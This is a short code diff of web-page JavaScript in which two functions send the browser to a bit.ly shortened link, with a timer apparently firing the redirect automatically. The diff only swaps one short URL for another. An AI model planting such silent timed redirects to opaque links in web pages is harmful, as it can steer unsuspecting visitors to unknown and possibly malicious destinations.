@@ -5,8 +5,8 @@
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://bit.ly/yhauajjdng";
+        location.href="https://bit.ly/Link-scripted";
     }
     function goon(){
-        location.href="https://bit.ly/yhauajjdng";
+        location.href="https://bit.ly/Link-scripted";
     }
